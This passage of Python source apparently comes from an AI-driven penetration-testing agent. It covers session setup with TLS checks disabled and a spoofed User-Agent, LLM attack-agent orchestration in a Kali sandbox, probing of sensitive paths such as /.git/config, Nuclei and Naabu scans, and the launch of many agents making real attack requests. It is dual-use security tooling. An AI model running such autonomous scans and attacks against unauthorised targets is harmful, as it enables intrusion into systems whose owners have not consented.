            if total_chars >= self.MAX_CUSTOM_CONTEXT_CHARS:
                parts.append("(truncated — context limit reached)")
                break

        return "\n".join(parts)

    def _get_custom_prompts_for_vuln_type(self, vuln_type: str) -> str:
        """Get custom prompt content relevant to a specific vulnerability type."""
        if not self.loaded_custom_prompts:
            return ""

        relevant = []
        for p in self.loaded_custom_prompts:
            parsed = p.get("parsed_vulnerabilities", [])
            if not parsed:
                # General prompt — applies to all types
                relevant.append(p)
            elif any(
                v.get("type", "").lower() == vuln_type.lower()
                for v in parsed
            ):
                relevant.append(p)

        if not relevant:
            return ""

        parts = [f"\n## Custom Guidance for {vuln_type}"]
        for p in relevant[:3]:  # Max 3 prompts per vuln type
            parts.append(f"### {p.get('name', '')}")
            parts.append(p.get("content", "")[:1500])
        return "\n".join(parts)

    async def _default_log(self, level: str, message: str):
        timestamp = datetime.utcnow().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level.upper()}] {message}")

    async def __aenter__(self):
        connector = aiohttp.TCPConnector(ssl=False, limit=30)
        timeout = aiohttp.ClientTimeout(total=30, connect=10)
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
        }
        headers.update(self.auth_headers)
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=headers,
            cookie_jar=aiohttp.CookieJar(unsafe=True)
        )

        # Initialize autonomy modules that depend on session
        self.request_engine = RequestEngine(
            self.session, default_delay=0.1, max_retries=3,
            is_cancelled_fn=self.is_cancelled
        )
        self.waf_detector = WAFDetector(self.request_engine)
        self.strategy = StrategyAdapter(self.memory)
        self.auth_manager = AuthManager(self.request_engine, self.recon)

        # Phase 2: Session-dependent modules
        if HAS_CVE_HUNTER:
            self.cve_hunter = CVEHunter(self.session)
        if HAS_DEEP_RECON:
            self.deep_recon = DeepRecon(self.request_engine)

        # Phase 3.5: Inject session into repeater and site analyzer
        if self.request_repeater:
            self.request_repeater.session = self.session
        if self.site_analyzer:
            self.site_analyzer.session = self.session
            self.site_analyzer.llm = self.llm

        # Phase 4: PoC validator needs request engine
        if HAS_POC_VALIDATOR:
            self.poc_validator_engine = PoCValidator(self.request_engine)

        # Phase 5: Multi-agent orchestrator (opt-in via ENABLE_MULTI_AGENT)
        if (HAS_MULTI_AGENT and
                os.getenv("ENABLE_MULTI_AGENT", "false").lower() == "true"):
            self._orchestrator = AgentOrchestrator(
                llm=self.llm,
                memory=self.memory,
                budget=self.token_budget,
                request_engine=self.request_engine,
            )

        # Phase 5.5: MD-based agent orchestrator (always available)
        # Agents execute REAL HTTP requests via the shared aiohttp session
        if HAS_MD_AGENTS:
            self._md_orchestrator = MdAgentOrchestrator(
                llm=self.llm,
                memory=self.memory,
                budget=self.token_budget,
                validation_judge=self.validation_judge,
                log_callback=self.log,
                progress_callback=self.progress_callback,
                http_session=self.session,
                auth_headers=dict(self.auth_headers),
                cancel_fn=self.is_cancelled,
            )

        # Researcher AI: 0-day discovery with Kali sandbox (opt-in)
        researcher_enabled = (
            HAS_RESEARCHER
            and self.enable_kali_sandbox
            and os.getenv("ENABLE_RESEARCHER_AI", "true").lower() == "true"
        )
        if researcher_enabled:
            self._researcher = ResearcherAgent(
                llm=self.llm,
                scan_id=self.scan_id or "default",
                target=self.target,
                log_callback=self.log,
                progress_callback=self.progress_callback,
                finding_callback=self.finding_callback,
                token_budget=self.token_budget,
            )

        # CLI Agent Runner: AI CLI tools inside Kali sandbox (opt-in)
        self._cli_agent = None
        cli_agent_enabled = (
            HAS_CLI_AGENT
            and (self.enable_cli_agent or self.mode == OperationMode.CLI_AGENT)
            and os.getenv("ENABLE_CLI_AGENT", "false").lower() == "true"
        )
        if cli_agent_enabled:
            self._cli_agent = CLIAgentRunner(
                scan_id=self.scan_id or "default",
                target=self.target,
                cli_provider_id=self.cli_agent_provider or os.getenv("CLI_AGENT_DEFAULT_PROVIDER", "claude_code"),
                methodology_path=self._methodology_file_path or os.getenv("METHODOLOGY_FILE"),
                preferred_model=self.preferred_model,
                log_callback=self.log,
                progress_callback=self.progress_callback,
                finding_callback=self.finding_callback,
                auth_headers=self.auth_headers,
                token_budget=self.token_budget,
                llm=self.llm,
            )

        # Phase 6: Per-vuln-type agent orchestrator (opt-in via ENABLE_VULN_AGENTS)
        if (HAS_VULN_AGENTS and
                os.getenv("ENABLE_VULN_AGENTS", "false").lower() == "true"):
            max_concurrent = int(os.getenv("VULN_AGENT_CONCURRENCY", "10"))
            self._vuln_orchestrator = VulnOrchestrator(
                parent_agent=self,
                max_concurrent=max_concurrent,
                ws_broadcast=self._vuln_agent_ws_broadcast,
            )

        # RAG: Index knowledge sources (runs once, cached on disk)
        if self.rag_engine:
            try:
                self.rag_engine.index_all()
            except Exception as e:
                logger.warning(f"RAG indexing failed: {e}")

        return self

    async def __aexit__(self, *args):
        # Cleanup CLI agent sandbox
        if getattr(self, '_cli_agent', None):
            try:
                await self._cli_agent.shutdown()
            except Exception:
                pass
        # Cleanup researcher sandbox
        if self._researcher:
            try:
                await self._researcher.shutdown()
            except Exception:
                pass
        # Cleanup per-scan sandbox container
        if self.scan_id and self._sandbox:
            try:
                _cname = getattr(self._sandbox, 'container_name', 'unknown')
                await self.log("info", f"[CONTAINER] Destroying Kali container {_cname}...")
                from core.container_pool import get_pool
                await get_pool().destroy(self.scan_id)
                self._sandbox = None
                if self.container_status:
                    self.container_status["online"] = False
                await self.log("info", "[CONTAINER] Container destroyed successfully")
            except Exception as e:
                await self.log("warning", f"[CONTAINER] Cleanup failed: {e}")
                self._sandbox = None
        # Cleanup site analyzer temp directory
        if self.site_analyzer:
            try:
                self.site_analyzer.cleanup()
            except Exception:
                pass
        if self.session:
            await self.session.close()

    async def run(self) -> Dict[str, Any]:
        """Main execution method"""
        await self.log("info", "=" * 60)
        await self.log("info", "  NEUROSPLOIT AI SECURITY AGENT")
        await self.log("info", "=" * 60)
        await self.log("info", f"Target: {self.target}")
        await self.log("info", f"Mode: {self.mode.value}")

        if self.llm.is_available():
            provider_info = self.llm.provider.upper()
            model_info = self.llm.model_name or "auto"
            await self.log("success", f"LLM Provider: {provider_info} | Model: {model_info}")
            if self.preferred_provider or self.preferred_model:
                await self.log("info", f"User preference: provider={self.preferred_provider or 'auto'}, model={self.preferred_model or 'auto'}")
        else:
            await self.log("error", "=" * 60)
            await self.log("error", "  WARNING: LLM NOT CONFIGURED!")
            await self.log("error", "=" * 60)
            await self.log("warning", "Set ANTHROPIC_API_KEY in .env file")
            await self.log("warning", "Running with basic detection only (no AI enhancement)")
            if self.llm.error_message:
                await self.log("warning", f"Reason: {self.llm.error_message}")

        await self.log("info", "")

        try:
            if self.mode == OperationMode.RECON_ONLY:
                return await self._run_recon_only()
            elif self.mode == OperationMode.FULL_AUTO:
                return await self._run_full_auto()
            elif self.mode == OperationMode.PROMPT_ONLY:
                return await self._run_prompt_only()
            elif self.mode == OperationMode.ANALYZE_ONLY:
                return await self._run_analyze_only()
            elif self.mode == OperationMode.AUTO_PENTEST:
                return await self._run_auto_pentest()
            elif self.mode == OperationMode.CLI_AGENT:
                return await self._run_cli_agent_mode()
            elif self.mode == OperationMode.FULL_LLM_PENTEST:
                return await self._run_full_llm_pentest()
            else:
                return await self._run_full_auto()
        except Exception as e:
            await self.log("error", f"Agent error: {str(e)}")
            import traceback
            traceback.print_exc()
            return self._generate_error_report(str(e))

    async def _update_progress(self, progress: int, phase: str):
        self._last_progress = progress
        self._last_phase = phase
        if self.progress_callback:
            await self.progress_callback(progress, phase)
        # Save checkpoint at key milestones (every 10%)
        if self._checkpoint_manager and progress % 10 == 0 and progress > 0:
            self._save_checkpoint()

    # ==================== RECONNAISSANCE ====================

    async def _run_recon_only(self) -> Dict:
        """Comprehensive reconnaissance"""
        await self._update_progress(0, "Starting reconnaissance")

        # Phase 1: Initial probe
        await self.log("info", "[PHASE 1/4] Initial Probe")
        await self._initial_probe()
        await self._update_progress(25, "Initial probe complete")

        # Phase 2: Endpoint discovery
        await self.log("info", "[PHASE 2/4] Endpoint Discovery")
        await self._discover_endpoints()
        await self._update_progress(50, "Endpoint discovery complete")

        # Phase 3: Parameter discovery
        await self.log("info", "[PHASE 3/4] Parameter Discovery")
        await self._discover_parameters()
        await self._update_progress(75, "Parameter discovery complete")

        # Phase 4: Technology detection
        await self.log("info", "[PHASE 4/4] Technology Detection")
        await self._detect_technologies()
        await self._update_progress(100, "Reconnaissance complete")

        return self._generate_recon_report()

    async def _initial_probe(self):
        """Initial probe of the target"""
        try:
            async with self.session.get(self.target, allow_redirects=True) as resp:
                self.recon.live_hosts.append(self.target)
                body = await resp.text()

                # Extract base information
                await self._extract_links(body, self.target)
                await self._extract_forms(body, self.target)
                await self._extract_js_files(body, self.target)

                await self.log("info", f"  Target is live: {resp.status}")
        except Exception as e:
            await self.log("error", f"  Target probe failed: {e}")

    async def _discover_endpoints(self):
        """Discover endpoints through crawling and common paths"""
        # Common paths to check
        common_paths = [
            "/", "/admin", "/login", "/api", "/api/v1", "/api/v2",
            "/user", "/users", "/account", "/profile", "/dashboard",
            "/search", "/upload", "/download", "/file", "/files",
            "/config", "/settings", "/admin/login", "/wp-admin",
            "/robots.txt", "/sitemap.xml", "/.git/config",
            "/api/users", "/api/login", "/graphql", "/api/graphql",
            "/swagger", "/api-docs", "/docs", "/health", "/status"
        ]

        base = self.target.rstrip('/')
        parsed_target = urlparse(self.target)

        # Add known vulnerable endpoints for common test sites
        if "vulnweb" in parsed_target.netloc or "testphp" in parsed_target.netloc:
            await self.log("info", "  Detected test site - adding known vulnerable endpoints")
            common_paths.extend([
                "/listproducts.php?cat=1",
                "/artists.php?artist=1",
                "/search.php?test=1",
                "/guestbook.php",
                "/comment.php?aid=1",
                "/showimage.php?file=1",
                "/product.php?pic=1",
                "/hpp/?pp=12",
                "/AJAX/index.php",
                "/secured/newuser.php",
            ])
        elif "juice-shop" in parsed_target.netloc or "juiceshop" in parsed_target.netloc:
            common_paths.extend([
                "/rest/products/search?q=test",
                "/api/Users",
                "/api/Products",
                "/rest/user/login",
            ])
        elif "dvwa" in parsed_target.netloc:
            common_paths.extend([
                "/vulnerabilities/sqli/?id=1&Submit=Submit",
                "/vulnerabilities/xss_r/?name=test",
                "/vulnerabilities/fi/?page=include.php",
            ])

        tasks = []
        for path in common_paths:
            tasks.append(self._check_endpoint(f"{base}{path}"))

        await asyncio.gather(*tasks, return_exceptions=True)

        # Crawl discovered pages for more endpoints
        for endpoint in list(self.recon.endpoints)[:10]:
            await self._crawl_page(_get_endpoint_url(endpoint))

        await self.log("info", f"  Found {len(self.recon.endpoints)} endpoints")

    async def _check_endpoint(self, url: str):
        """Check if endpoint exists"""
        try:
            async with self.session.get(url, allow_redirects=False) as resp:
                if resp.status not in [404, 403, 500, 502, 503]:
                    endpoint_data = {
                        "url": url,
                        "method": "GET",
                        "status": resp.status,
                        "content_type": resp.headers.get("Content-Type", ""),
                        "path": urlparse(url).path
                    }
                    if endpoint_data not in self.recon.endpoints:
                        self.recon.endpoints.append(endpoint_data)
        except:
            pass

    async def _crawl_page(self, url: str):
        """Crawl a page for more links and forms"""
        if not url:
            return
        try:
            async with self.session.get(url) as resp:
                body = await resp.text()
                await self._extract_links(body, url)
                await self._extract_forms(body, url)
        except:
            pass

    async def _extract_links(self, body: str, base_url: str):
        """Extract links from HTML"""
        # Find href links
        hrefs = re.findall(r'href=["\']([^"\']+)["\']', body, re.I)
        # Find src links
        srcs = re.findall(r'src=["\']([^"\']+)["\']', body, re.I)
        # Find action links
        actions = re.findall(r'action=["\']([^"\']+)["\']', body, re.I)

        base_parsed = urlparse(base_url)
        base_domain = f"{base_parsed.scheme}://{base_parsed.netloc}"

        for link in hrefs + actions:
            if link.startswith('/'):
                full_url = base_domain + link
            elif link.startswith('http') and base_parsed.netloc in link:
                full_url = link
            else:
                continue

            # Skip external links and assets
            if any(ext in link.lower() for ext in ['.css', '.png', '.jpg', '.gif', '.ico', '.svg']):
                continue

            endpoint_data = {
                "url": full_url,
                "method": "GET",
                "path": urlparse(full_url).path
            }
            if endpoint_data not in self.recon.endpoints and len(self.recon.endpoints) < 100:
                self.recon.endpoints.append(endpoint_data)

    async def _extract_forms(self, body: str, base_url: str):
        """Extract forms from HTML including input types and hidden field values"""
        # Capture the opening <form> tag attributes AND inner content separately
        form_pattern = r'<form([^>]*)>(.*?)</form>'
        forms = re.findall(form_pattern, body, re.I | re.DOTALL)

        base_parsed = urlparse(base_url)

        for form_attrs, form_html in forms:
            # Extract action from the <form> tag attributes
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_attrs, re.I)
            action = action_match.group(1) if action_match else base_url

            if action.startswith('/'):
                action = f"{base_parsed.scheme}://{base_parsed.netloc}{action}"
            elif not action.startswith('http'):
                action = base_url

            # Extract method from the <form> tag attributes
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_attrs, re.I)
            method = (method_match.group(1) if method_match else "GET").upper()

            # Extract inputs with type and value details
            inputs = []
            input_details = []
            input_elements = re.findall(r'<input[^>]*>', form_html, re.I)
            for inp_el in input_elements:
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp_el, re.I)
                if not name_m:
                    continue
                name = name_m.group(1)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp_el, re.I)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp_el, re.I)
                inp_type = type_m.group(1).lower() if type_m else "text"
                inp_value = val_m.group(1) if val_m else ""
                inputs.append(name)
                input_details.append({
                    "name": name, "type": inp_type, "value": inp_value
                })

            # Textareas (always user-editable text)
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
            for ta in textareas:
                inputs.append(ta)
                input_details.append({"name": ta, "type": "textarea", "value": ""})

            # Select elements (dropdown values)
            selects = re.findall(r'<select[^>]*name=["\']([^"\']+)["\'].*?</select>', form_html, re.I | re.DOTALL)
            for sel_match in re.finditer(r'<select[^>]*name=["\']([^"\']+)["\'][^>]*>(.*?)</select>', form_html, re.I | re.DOTALL):
                sel_name = sel_match.group(1)
                # Get first option value as default
                first_opt = re.search(r'<option[^>]*value=["\']([^"\']*)["\']', sel_match.group(2), re.I)
                sel_value = first_opt.group(1) if first_opt else ""
                if sel_name not in inputs:
                    inputs.append(sel_name)
                    input_details.append({"name": sel_name, "type": "select", "value": sel_value})

            form_data = {
                "action": action,
                "method": method,
                "inputs": inputs,
                "input_details": input_details,
                "page_url": base_url,
            }
            self.recon.forms.append(form_data)

    async def _extract_js_files(self, body: str, base_url: str):
        """Extract JavaScript files"""
        js_files = re.findall(r'src=["\']([^"\']*\.js)["\']', body, re.I)
        base_parsed = urlparse(base_url)

        for js in js_files[:10]:
            if js.startswith('/'):
                full_url = f"{base_parsed.scheme}://{base_parsed.netloc}{js}"
            elif js.startswith('http'):
                full_url = js
            else:
                continue

            if full_url not in self.recon.js_files:
                self.recon.js_files.append(full_url)
                # Try to extract API endpoints from JS
                await self._extract_api_from_js(full_url)

    async def _extract_api_from_js(self, js_url: str):
        """Extract API endpoints from JavaScript files"""
        try:
            async with self.session.get(js_url) as resp:
                content = await resp.text()

                # Find API patterns
                api_patterns = [
                    r'["\']/(api/[^"\']+)["\']',
                    r'["\']/(v[0-9]/[^"\']+)["\']',
                    r'fetch\s*\(\s*["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
                ]

                for pattern in api_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches[:5]:
                        if match.startswith('/'):
                            base = urlparse(self.target)
                            full_url = f"{base.scheme}://{base.netloc}{match}"
                        else:
                            full_url = match
                        if full_url not in self.recon.api_endpoints:
                            self.recon.api_endpoints.append(full_url)
        except:
            pass

    async def _discover_parameters(self):
        """Discover parameters in endpoints"""
        for endpoint in self.recon.endpoints[:20]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)

            # Extract query parameters
            if parsed.query:
                params = parse_qs(parsed.query)
                self.recon.parameters[url] = list(params.keys())

        # Also get parameters from forms
        for form in self.recon.forms:
            self.recon.parameters[form['action']] = form.get('inputs', [])

        total_params = sum(len(v) for v in self.recon.parameters.values())
        await self.log("info", f"  Found {total_params} parameters in {len(self.recon.parameters)} endpoints")

    async def _detect_technologies(self):
        """Detect technologies used"""
        try:
            async with self.session.get(self.target) as resp:
                headers = dict(resp.headers)
                body = await resp.text()

                # Server header
                if "Server" in headers:
                    self.recon.technologies.append(f"Server: {headers['Server']}")

                # X-Powered-By
                if "X-Powered-By" in headers:
                    self.recon.technologies.append(headers["X-Powered-By"])

                # Technology signatures
                signatures = {
                    "WordPress": ["wp-content", "wp-includes", "wordpress"],
                    "Laravel": ["laravel", "XSRF-TOKEN", "laravel_session"],
                    "Django": ["csrfmiddlewaretoken", "__admin__", "django"],
                    "Express.js": ["express", "X-Powered-By: Express"],
                    "ASP.NET": ["__VIEWSTATE", "asp.net", ".aspx"],
                    "PHP": [".php", "PHPSESSID"],
                    "React": ["react", "_reactRoot", "__REACT"],
                    "Angular": ["ng-app", "ng-", "angular"],
                    "Vue.js": ["vue", "__VUE", "v-if", "v-for"],
                    "jQuery": ["jquery", "$.ajax"],
                    "Bootstrap": ["bootstrap", "btn-primary"],
                }

                body_lower = body.lower()
                headers_str = str(headers).lower()

                for tech, patterns in signatures.items():
                    if any(p.lower() in body_lower or p.lower() in headers_str for p in patterns):
                        if tech not in self.recon.technologies:
                            self.recon.technologies.append(tech)

        except Exception as e:
            await self.log("debug", f"Tech detection error: {e}")

        await self.log("info", f"  Detected: {', '.join(self.recon.technologies[:5]) or 'Unknown'}")

    # ==================== VULNERABILITY TESTING ====================

    async def _run_full_auto(self) -> Dict:
        """Full automated assessment"""
        await self._update_progress(0, "Starting full assessment")

        # Pre-flight: target health check
        if self.session:
            healthy, health_info = await self.response_verifier.check_target_health(
                self.session, self.target
            )
            if healthy:
                await self.log("info", f"[HEALTH] Target is alive (status={health_info.get('status')}, "
                               f"server={health_info.get('server', 'unknown')})")
            else:
                reason = health_info.get("reason", "unknown")
                await self.log("warning", f"[HEALTH] Target may be unhealthy: {reason}")
                await self.log("warning", "[HEALTH] Proceeding with caution - results may be unreliable")

        # Phase 1: Reconnaissance
        skip_target = self._check_skip("recon")
        if skip_target:
            await self.log("warning", f">> SKIPPING Reconnaissance -> jumping to {skip_target}")
            await self._update_progress(20, f"recon_skipped")
        else:
            await self.log("info", "[PHASE 1/5] Reconnaissance")
            await self._run_recon_only()
            await self._update_progress(20, "Reconnaissance complete")

        # Phase 1b: WAF Detection
        if self.waf_detector and not self._waf_result:
            try:
                self._waf_result = await self.waf_detector.detect(self.target)
                if self._waf_result and self._waf_result.detected_wafs:
                    for w in self._waf_result.detected_wafs:
                        waf_label = f"WAF:{w.name} ({w.confidence:.0%})"
                        if waf_label not in self.recon.technologies:
                            self.recon.technologies.append(waf_label)
                        await self.log("warning", f"[WAF] Detected: {w.name} "
                                       f"(confidence: {w.confidence:.0%})")
                    if self.request_engine and self._waf_result.recommended_delay > self.request_engine.default_delay:
                        self.request_engine.default_delay = self._waf_result.recommended_delay
                else:
                    await self.log("info", "[WAF] No WAF detected")
            except Exception as e:
                await self.log("debug", f"[WAF] Detection failed: {e}")

        # Phase 2: AI Attack Surface Analysis
        skip_target = self._check_skip("analysis")
        if skip_target:
            await self.log("warning", f">> SKIPPING Analysis -> jumping to {skip_target}")
            attack_plan = self._default_attack_plan()
            await self._update_progress(30, f"analysis_skipped")
        else:
            await self.log("info", "[PHASE 2/5] AI Attack Surface Analysis")
            attack_plan = await self._ai_analyze_attack_surface()
            await self._update_progress(30, "Attack surface analyzed")

        # Phase 3: Vulnerability Testing
        skip_target = self._check_skip("testing")
        if skip_target:
            await self.log("warning", f">> SKIPPING Testing -> jumping to {skip_target}")
            await self._update_progress(70, f"testing_skipped")
        else:
            await self.log("info", "[PHASE 3/5] Vulnerability Testing")
            await self._test_all_vulnerabilities(attack_plan)
            await self._update_progress(70, "Vulnerability testing complete")

        # Phase 4: AI Finding Enhancement
        skip_target = self._check_skip("enhancement")
        if skip_target:
            await self.log("warning", f">> SKIPPING Enhancement -> jumping to {skip_target}")
            await self._update_progress(90, f"enhancement_skipped")
        else:
            await self.log("info", "[PHASE 4/5] AI Finding Enhancement")
            await self._ai_enhance_findings()
            await self._update_progress(90, "Findings enhanced")

        # Phase 5: Report Generation
        await self.log("info", "[PHASE 5/5] Report Generation")
        report = await self._generate_full_report()
        await self._update_progress(100, "Assessment complete")

        return report

    async def _run_sandbox_scan(self):
        """Run Nuclei + Naabu via Docker sandbox if available."""
        if not HAS_SANDBOX:
            await self.log("info", "  Sandbox not available (docker SDK missing), skipping")
            return

        try:
            sandbox = await get_sandbox(scan_id=self.scan_id)
            if not sandbox.is_available:
                await self.log("info", "  Sandbox container not running, skipping sandbox tools")
                return

            self._sandbox = sandbox
            self.container_status = {
                "online": True,
                "container_id": getattr(sandbox, 'container_id', None),
                "container_name": getattr(sandbox, 'container_name', None),
                "image": getattr(sandbox, 'image', None),
                "image_digest": getattr(sandbox, 'image_digest', None),
                "created_at": getattr(sandbox, '_created_at', None),
            }
            await self.log("info", f"[CONTAINER] Container ONLINE: "
                           f"{sandbox.container_name} ({getattr(sandbox, 'container_id', 'N/A')})")

            await self.log("info", "  [Sandbox] Running Nuclei vulnerability scanner...")
            import time as _time
            _nuclei_start = _time.time()
            nuclei_result = await sandbox.run_nuclei(
                target=self.target,
                severity="critical,high,medium",
                rate_limit=150,
                timeout=600,
            )
            _nuclei_duration = round(_time.time() - _nuclei_start, 2)

            # Track tool execution with telemetry
            _nuclei_task_id = getattr(nuclei_result, 'task_id', None) or hashlib.md5(f"nuclei-{_nuclei_start}".encode()).hexdigest()[:8]
            self.tool_executions.append({
                "tool": "nuclei",
                "command": f"nuclei -u {self.target} -severity critical,high,medium -rl 150",
                "duration": _nuclei_duration,
                "findings_count": len(nuclei_result.findings) if nuclei_result.findings else 0,
                "stdout_preview": nuclei_result.stdout[:2000] if hasattr(nuclei_result, 'stdout') and nuclei_result.stdout else "",
                "stderr_preview": nuclei_result.stderr[:500] if hasattr(nuclei_result, 'stderr') and nuclei_result.stderr else "",
                "exit_code": getattr(nuclei_result, 'exit_code', 0),
                "task_id": _nuclei_task_id,
                "container_id": getattr(self._sandbox, 'container_id', None) if self._sandbox else None,
                "container_name": getattr(self._sandbox, 'container_name', None) if self._sandbox else None,
                "image_digest": getattr(self._sandbox, 'image_digest', None) if self._sandbox else None,
                "start_time": getattr(nuclei_result, 'started_at', None),
                "end_time": getattr(nuclei_result, 'completed_at', None),
            })
            await self.log("info", f"[CONTAINER] task={_nuclei_task_id} tool=nuclei "
                           f"exit={getattr(nuclei_result, 'exit_code', 0)} duration={_nuclei_duration}s "
                           f"container={getattr(self._sandbox, 'container_name', 'N/A')}")

            if nuclei_result.findings:
                await self.log("info", f"  [Sandbox] Nuclei found {len(nuclei_result.findings)} issues ({_nuclei_duration}s)")
                for nf in nuclei_result.findings:
                    # Import Nuclei findings as agent findings
                    vuln_type = nf.get("vulnerability_type", "vulnerability")
                    if vuln_type not in self.memory.tested_combinations:
                        _nf_endpoint = nf.get("affected_endpoint", self.target)
                        _nf_evidence = f"Nuclei template: {nf.get('template_id', 'unknown')}. {nf.get('evidence', '')}"
                        nuclei_finding = Finding(
                            id=hashlib.md5(f"nuclei-{vuln_type}-{_nf_endpoint}".encode()).hexdigest()[:8],
                            title=nf.get("title", "Nuclei Finding"),
                            severity=nf.get("severity", "info"),
                            vulnerability_type=vuln_type,
                            affected_endpoint=_nf_endpoint,
                            evidence=_nf_evidence,
                            description=nf.get("description") or nf.get("evidence") or _nf_evidence,
                            remediation=nf.get("remediation", ""),
                            ai_verified=False,
                            payload=nf.get("payload", ""),
                            request=nf.get("request", ""),
                            response=nf.get("response", ""),
                        )
                        await self._add_finding(nuclei_finding)
            else:
                await self.log("info", f"  [Sandbox] Nuclei: no findings ({_nuclei_duration}s)")

            # Naabu port scan
            parsed = urlparse(self.target)
            host = parsed.hostname or parsed.netloc
            if host:
                await self.log("info", "  [Sandbox] Running Naabu port scanner...")
                _naabu_start = _time.time()
                naabu_result = await sandbox.run_naabu(
                    target=host,
                    top_ports=1000,
                    rate=1000,
                    timeout=120,
                )
                _naabu_duration = round(_time.time() - _naabu_start, 2)

                # Track tool execution with telemetry
                _naabu_task_id = getattr(naabu_result, 'task_id', None) or hashlib.md5(f"naabu-{_naabu_start}".encode()).hexdigest()[:8]
                self.tool_executions.append({
                    "tool": "naabu",
                    "command": f"naabu -host {host} -top-ports 1000 -rate 1000",
                    "duration": _naabu_duration,
                    "findings_count": len(naabu_result.findings) if naabu_result.findings else 0,
                    "stdout_preview": naabu_result.stdout[:2000] if hasattr(naabu_result, 'stdout') and naabu_result.stdout else "",
                    "stderr_preview": naabu_result.stderr[:500] if hasattr(naabu_result, 'stderr') and naabu_result.stderr else "",
                    "exit_code": getattr(naabu_result, 'exit_code', 0),
                    "task_id": _naabu_task_id,
                    "container_id": getattr(self._sandbox, 'container_id', None) if self._sandbox else None,
                    "container_name": getattr(self._sandbox, 'container_name', None) if self._sandbox else None,
                    "image_digest": getattr(self._sandbox, 'image_digest', None) if self._sandbox else None,
                    "start_time": getattr(naabu_result, 'started_at', None),
                    "end_time": getattr(naabu_result, 'completed_at', None),
                })
                await self.log("info", f"[CONTAINER] task={_naabu_task_id} tool=naabu "
                               f"exit={getattr(naabu_result, 'exit_code', 0)} duration={_naabu_duration}s "
                               f"container={getattr(self._sandbox, 'container_name', 'N/A')}")

                if naabu_result.findings:
                    open_ports = [str(f["port"]) for f in naabu_result.findings]
                    await self.log("info", f"  [Sandbox] Naabu found {len(open_ports)} open ports: {', '.join(open_ports[:20])} ({_naabu_duration}s)")
                    # Store port info in recon data
                    self.recon.technologies.append(f"Open ports: {', '.join(open_ports[:30])}")
                else:
                    await self.log("info", "  [Sandbox] Naabu: no open ports found")

        except Exception as e:
            await self.log("warning", f"  Sandbox scan error: {e}")

    async def _run_auto_pentest(self) -> Dict:
        """Agent-first auto pentest: Recon → 108 AI agents with real HTTP → Report.

        Architecture:
          Phase 1 (0-20%):  Quick recon — discover endpoints, tech, params, WAF
          Phase 2 (20-85%): Agent Grid — 108 agents execute real HTTP tests
          Phase 3 (85-100%): Finalization — screenshots, enhancement, report
        """
        await self._update_progress(0, "Auto pentest starting")
        await self.log("info", "=" * 60)
        await self.log("info", "  AGENT-FIRST AUTO PENTEST (108 AGENTS)")
        await self.log("info", "  Recon → Agent Grid (real HTTP) → Report | Claude 4.6")
        await self.log("info", "=" * 60)

        # Override custom_prompt with DEFAULT_ASSESSMENT_PROMPT for auto mode
        if not self.custom_prompt:
            self.custom_prompt = DEFAULT_ASSESSMENT_PROMPT

        # Shared state (needed by some helper methods)
        self._endpoint_queue = asyncio.Queue()
        self._recon_complete = asyncio.Event()
        self._tools_complete = asyncio.Event()
        self._stream_findings_count = 0
        self._junior_tested_types: set = set()
        self._playbook_recommended_types: List[str] = []
        self._current_playbook_context: str = ""
        self._master_plan: Dict = {}

        # ══════════════════════════════════════════════════════════════
        # PHASE 1 (0-20%): RECONNAISSANCE
        # Discover attack surface before dispatching agents
        # ══════════════════════════════════════════════════════════════
        await self.log("info", "[RECON] Mapping attack surface...")
        await self._update_progress(2, "Recon: mapping attack surface")

        # Run recon stream (endpoint discovery, tech detection, site analysis)
        self._recon_complete.clear()
        self._tools_complete.set()  # No tool stream in agent-first mode
        await self._stream_recon()

        ep_count = len(self.recon.endpoints)
        param_count = len(self.recon.parameters) if isinstance(self.recon.parameters, dict) else 0
        tech_count = len(self.recon.technologies)
        form_count = len(self.recon.forms) if hasattr(self.recon, 'forms') else 0
        js_count = len(self.recon.js_files) if hasattr(self.recon, 'js_files') else 0
        sink_count = len(self.recon.js_sinks) if hasattr(self.recon, 'js_sinks') else 0
        api_count = len(self.recon.api_endpoints) if hasattr(self.recon, 'api_endpoints') else 0

        await self.log("info",
            f"[RECON] Complete: {ep_count} endpoints, {param_count} params, "
            f"{tech_count} techs, {form_count} forms, {js_count} JS files, "
            f"{sink_count} sinks, {api_count} API endpoints")
        await self._update_progress(15, "Recon complete")

        # WAF info for agents
        waf_name = ""
        if hasattr(self, '_waf_result') and self._waf_result:
            if hasattr(self._waf_result, 'detected_wafs') and self._waf_result.detected_wafs:
                waf_name = ", ".join(
                    f"{w.name} ({w.confidence:.0%})" for w in self._waf_result.detected_wafs
                )
            elif isinstance(self._waf_result, dict):
                waf_name = self._waf_result.get("waf_name", "")
            if waf_name:
                await self.log("warning", f"[WAF] Detected: {waf_name} — agents will adapt payloads")

        # CVE hunting (quick, parallel with next phase)
        if self.cve_hunter and self.recon.technologies:
            try:
                cve_findings = await self.cve_hunter.hunt(
                    headers=dict(self.auth_headers),
                    body="",
                    technologies=self.recon.technologies,
                )
                for cvf in (cve_findings or []):
                    await self.log("info", f"  [CVE] Found: {getattr(cvf, 'cve_id', '?')} "
                                   f"({getattr(cvf, 'severity', 'unknown')})")
            except Exception as e:
                await self.log("debug", f"  [CVE] Hunt error: {e}")

        await self._update_progress(20, "Recon + CVE complete, launching agents")

        # ══════════════════════════════════════════════════════════════
        # PHASE 2 (20-85%): AGENT GRID — 108 SPECIALISTS WITH REAL HTTP
        # Each agent: LLM plans attacks → executes HTTP → LLM analyzes
        # ══════════════════════════════════════════════════════════════
        if self._md_orchestrator and not self.is_cancelled():
            try:
                n_available = len(self._md_orchestrator.library.agents)
                await self.log("info", "=" * 60)
